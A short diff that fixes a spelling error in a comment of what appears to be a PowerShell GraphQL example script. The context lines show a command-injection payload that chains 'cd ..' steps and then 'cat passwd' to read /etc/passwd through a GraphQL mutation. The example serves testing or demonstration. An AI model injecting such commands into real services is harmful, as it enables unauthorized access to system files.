@@ -278,7 +278,7 @@ Invoke-GraphQLQuery -Query $commandInjectionQuery -Uri $gqlEndpointUri -Raw
 # This is abstracting "cat /etc/passwd via the following:
 # 1. Change directory via "cd" repeatedly to get to the root directory
 # 2. Change director to the etc directory...
-# 3. ...and fininally execute "cat" (concatenate) to read the contents of the passwd file:
+# 3. ...and finally execute "cat" (concatenate) to read the contents of the passwd file:
 $commandToInject = "cd .. && cd .. && cd .. && cd etc && cat passwd"
 
 $commandInjectionMutation = '
